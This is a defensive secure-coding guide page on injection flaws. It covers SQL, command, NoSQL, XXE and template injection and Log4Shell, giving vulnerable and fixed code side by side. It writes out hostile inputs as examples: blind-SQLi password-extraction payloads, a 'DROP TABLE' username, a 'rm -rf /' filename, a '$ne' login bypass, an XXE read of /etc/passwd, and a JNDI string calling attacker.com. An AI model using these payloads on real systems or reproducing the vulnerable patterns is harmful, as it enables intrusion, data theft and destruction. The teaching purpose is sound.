# Injection Security

## Why Injection Happens, Architecturally

Injection is **A05:2025** in the OWASP Top 10, and every injection flaw - SQL, command, LDAP, NoSQL, XML, template - shares the same root cause: **untrusted data crosses a trust boundary into an interpreter without being treated as pure data.** The interpreter (a SQL engine, a shell, a template engine, an XML parser) can't tell the difference between "instructions" and "data" once they're concatenated into the same string - so if attacker-controlled bytes end up inside that string, the attacker gets to write instructions.

[Secure Coding](secure-coding.md) already covers the baseline fix (parameterized queries) with a short SQL example - this page goes deeper across injection *types*, since each interpreter has its own dialect of the same underlying problem.

## SQL Injection, Beyond the Basics

The parameterized-query fix in [Secure Coding](secure-coding.md) stops the most common form, but two variants trip up even teams that "already fixed" SQL injection:

**Blind SQL injection** - the response doesn't show query output directly, but the application's *behavior* still leaks information:

- **Boolean-based blind**: `?id=1 AND 1=1` returns a normal page, `?id=1 AND 1=2` returns an error or empty result - an attacker can extract data one bit at a time by asking true/false questions (`AND (SELECT SUBSTRING(password,1,1) FROM users WHERE id=1)='a'`).
- **Time-based blind**: when even the true/false behavior is identical, `?id=1 AND IF(1=1, SLEEP(5), 0)` uses response time as the signal instead.

**Second-order SQL injection** - the payload is stored safely (even parameterized on write), but later read back and concatenated unsafely into a *different* query:

```python
# Step 1: user registers with username = O'Brien'; DROP TABLE users;--
# This INSERT is parameterized and safe:
cursor.execute("INSERT INTO users (username) VALUES (%s)", (username,))

# Step 2, weeks later, an admin report page builds a query from the STORED value:
cursor.execute(f"SELECT * FROM logs WHERE username = '{stored_username}'")
# The injection fires here - nowhere near where the "unsafe" data came from
```

The bug is invisible if you only review the insertion code path - it requires tracing stored data all the way to every place it's later read and reused in a query.

**ORMs are not automatically safe.** Most ORM query builders parameterize correctly by default, but every ORM also exposes a raw-query escape hatch, and string-built `.where()`/`.filter()` clauses reintroduce the exact same bug:

```python
# Vulnerable even though it's "using an ORM"
User.objects.raw(f"SELECT * FROM users WHERE username = '{username}'")

# Secure - parameterized through the ORM's own API
User.objects.filter(username=username)
```

## Command Injection

Passing untrusted input to a shell lets an attacker chain additional commands using shell metacharacters (`;`, `|`, `&&`, backticks).

```python
import subprocess

# Vulnerable - shell=True interprets metacharacters in user_filename
subprocess.run(f"convert {user_filename} output.png", shell=True)
# user_filename = "photo.jpg; rm -rf /" executes a second command

# Secure - argument-list form, no shell involved, no metacharacter interpretation
subprocess.run(["convert", user_filename, "output.png"], shell=False)
```

The argument-list form passes each element directly to the program's `exec()` call - there's no shell parsing step for metacharacters to exploit, even if `user_filename` contains `;` or `|` characters (they're just literal characters in a filename argument at that point, not shell syntax).

## NoSQL Injection

Document databases like MongoDB use query *objects*, not query strings - but if user input is passed straight into that object structure instead of being treated as a scalar value, an attacker can inject query operators:

```javascript
// Vulnerable - if req.body.password is an OBJECT instead of a string
// (easy for an attacker to send via JSON: {"password": {"$ne": null}})
db.users.findOne({ username: req.body.username, password: req.body.password });
// {"$ne": null} means "password is not equal to null" - matches almost any user

// Secure - explicitly coerce/validate types before building the query
const password = String(req.body.password);
db.users.findOne({ username: req.body.username, password: password });
```

The fix is the same principle as SQL injection: never let attacker-controlled input dictate the *structure* of a query, only its scalar values.

## XXE (XML External Entity) Injection

If an XML parser resolves external entities, an attacker-supplied XML document can reference local files or trigger [SSRF](../../product-security/application-security/api-security.md) by declaring a custom entity that points at a file path or URL:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<user><name>&xxe;</name></user>
<!-- the parsed "name" field now contains the contents of /etc/passwd -->
```

**Fix: disable external entity resolution entirely** - almost no legitimate application needs it:

```python
# Python's lxml - vulnerable default in older versions
from lxml import etree
tree = etree.parse(user_supplied_xml)

# Secure - explicitly disable external entities and DTD resolution
parser = etree.XMLParser(resolve_entities=False, no_network=True, dtd_validation=False)
tree = etree.parse(user_supplied_xml, parser)
```

Most modern XML libraries (recent `lxml`, Java's `DocumentBuilderFactory` with `FEATURE_SECURE_PROCESSING`) disable this by default now - but plenty of production code still runs on older defaults or explicitly re-enables it for a legitimate-seeming reason and forgets the risk.

## Server-Side Template Injection (SSTI)

Less well-known than SQLi, but increasingly common as template engines get used for user-facing customization (email templates, report generation). If user input is rendered *as* a template rather than passed *into* one, the attacker can execute template-engine expressions - which in engines like Jinja2 can escalate to full code execution:

```python
# Vulnerable - user input becomes part of the template source
from jinja2 import Template
Template(f"Hello {user_supplied_name}").render()
# user_supplied_name = "{{ 7*7 }}" renders as "Hello 49" - proves code execution
# From here, known Jinja2 SSTI-to-RCE chains exist

# Secure - user input is DATA passed into a fixed template, never template source
Template("Hello {{ name }}").render(name=user_supplied_name)
```

The tell-tale sign during code review: a template engine's `render()`/`compile()` call fed a string built with f-strings/concatenation from user input, instead of a fixed template string with user input passed as a variable.

## How SAST Tools Actually Find These: Taint Analysis

Every injection type above follows the same **source → sink** pattern that [SAST](sast.md) tools are built to detect: a *source* (user input - a request parameter, header, uploaded file) flows, possibly through several function calls, into a *sink* (a SQL query, a shell command, a template render) without passing through a recognized sanitizer in between. This is why SAST tools are genuinely effective at catching injection specifically, even though they miss business-logic flaws entirely - injection is a pure data-flow property, and data flow is exactly what static analysis is good at modeling.

## Real-World Incident: Log4Shell as an Injection Bug

[SCA](sca.md) already covers Log4Shell (CVE-2021-44228) as a dependency-risk case study - worth adding the *injection mechanism* specifically, since it's a textbook (if unusual) source-to-sink chain: Log4j's JNDI lookup feature would evaluate `${jndi:ldap://attacker.com/a}`-style expressions found *inside logged strings*. Any application that logged attacker-influenced input (a User-Agent header, a login username, an API parameter) unknowingly handed the attacker a route from "text that gets logged" (source) to "remote class loading via JNDI" (sink) - one of the most severe examples of an injection sink existing somewhere nobody expected one (a logging call).

## Checklist

- [ ] All database queries use parameterization - including raw/ORM-escape-hatch queries and second-order reads of previously-stored data
- [ ] Shell commands use argument-list execution (`shell=False`), never string-built shell invocations
- [ ] NoSQL query inputs are type-checked/coerced before being placed into query objects
- [ ] XML parsers have external entity resolution and DTD processing disabled
- [ ] Template engines never render user-supplied strings as template source - only as variables passed into a fixed template
- [ ] SAST taint-analysis rules cover every interpreter your application touches, not just SQL

## Credits/References

1. [OWASP Top 10:2025 - A05 Injection](https://owasp.org/Top10/2025/)
2. [OWASP Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html)
3. [OWASP XML External Entity (XXE) Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
4. [OWASP Code Review Guide](https://owasp.org/www-project-code-review-guide/)
5. [CVE-2021-44228 (Log4Shell)](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)
